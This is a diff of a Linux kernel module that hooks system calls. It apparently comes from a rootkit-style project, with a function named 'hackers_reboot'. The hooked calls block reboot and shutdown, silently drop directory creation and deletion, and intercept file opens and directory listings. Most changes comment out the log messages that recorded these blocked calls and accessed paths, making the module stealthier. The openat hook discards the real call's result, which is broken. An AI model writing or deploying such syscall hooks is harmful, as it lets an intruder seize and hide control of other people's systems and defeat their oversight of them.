@@ -39,6 +39,7 @@ asmlinkage long sys_getdents_new(unsigned int fd, struct linux_dirent __user *di
 	struct linux_dirent* ent;
 	long ret = orig_getdents(fd, dirent, count);
 	char* dbuf;
+    printk("Project: Get Dents called");
 	if (ret <= 0) {
 		return ret;
 	}
@@ -66,7 +67,7 @@ asmlinkage int hackers_reboot(int magic1,int magic2,int magic3, void* arg)
     {
         return old_reboot_sys_call(magic1,magic2,magic3,arg);
     }
-    printk("Project: Blocked Reboot Call\n");
+    //printk("Project: Blocked Reboot Call\n");
     return EPERM;
 }
 asmlinkage int my_openat(const struct pt_regs *regs){
@@ -74,7 +75,7 @@ asmlinkage int my_openat(const struct pt_regs *regs){
     printk("Project:a check");
     char dir_name[100] = {0};
     strncpy_from_user(dir_name, filename, 100);
-     printk("Project:Trying to access file with path: %s\n", dir_name);
+     //printk("Project:Trying to access file with path: %s\n", dir_name);
      orig_openat(regs);
     return 0;
 }
@@ -85,7 +86,7 @@ asmlinkage int my_shutdown(int para1, int para2) {
     {
         return orig_shutdown(para1,para2);
     }
-    printk("Project: Blocked Shutdown Call\n");
+    //printk("Project: Blocked Shutdown Call\n");
     return EPERM;
 }
 
@@ -94,7 +95,7 @@ asmlinkage int my_rmdir(const struct pt_regs *regs)
     char __user *filename = (char *)regs->di;
     char dir_name[100] = {0};
     strncpy_from_user(dir_name, filename, 100);
-    printk("Project:Trying to delete directory with name: %s\n", dir_name);
+    //printk("Project:Trying to delete directory with name: %s\n", dir_name);
     //orig_rmdir(regs);
     return 0;
 }
@@ -103,7 +104,7 @@ asmlinkage int my_mkdir(const struct pt_regs *regs)
     char __user *filename = (char *)regs->di;
     char dir_name[100] = {0};
     strncpy_from_user(dir_name, filename, 100);
-    printk("Project:Trying to make directory with name: %s\n", dir_name);
+    //printk("Project:Trying to make directory with name: %s\n", dir_name);
     //orig_mkdir(regs);
     return 0;
 }
